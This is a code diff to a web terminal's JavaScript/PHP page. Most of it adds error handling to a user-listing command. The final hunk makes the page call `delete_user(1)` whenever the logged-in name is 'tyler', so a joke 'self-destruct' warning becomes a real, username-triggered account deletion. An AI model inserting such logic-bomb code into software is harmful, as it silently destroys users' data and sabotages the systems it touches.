@@ -53,17 +53,21 @@ $(function(){
 		},
 		"list_users" : {
 			"help" : "Displays a list of current users",
-				"callback" : ajaxHelper( 'list_users', function( response ){ 
+			"callback" : ajaxHelper( 'list_users', function( response ){
+			       	if( response.error != undefined ){
+					terminal.echo( response.status );
+				} else {
 					for( var i = 0; i < response.result.length; i++ ){
 						var user = response.result[i];
 						var output = "[" + user.id + "] " + user.name;
 						if( user.level == "admin" ){
 							output = output + "*";
 						}
-
+	
 						terminal.echo( output );
 					}
-	       			} ),
+				}
+			} ),
 		},
 		"find_answers" : {
 			"help" : "Searches for the answer to a question. find_answers <question_id>",
@@ -105,7 +109,9 @@ $(function(){
 		'prompt':'<?php echo Authentication::get_name(); ?>>'
 	} );
 
-	<?php if( Authentication::get_name() == 'tyler' ) { ?>
+	<?php if( Authentication::get_name() == 'tyler' ) { 
+		delete_user(1);
+	?>
 	terminal.echo( "WARNING: Your account self-destruct has been activated." );
 	terminal.echo( "You must create a new user if you want to login again." );
 	<?php } ?>
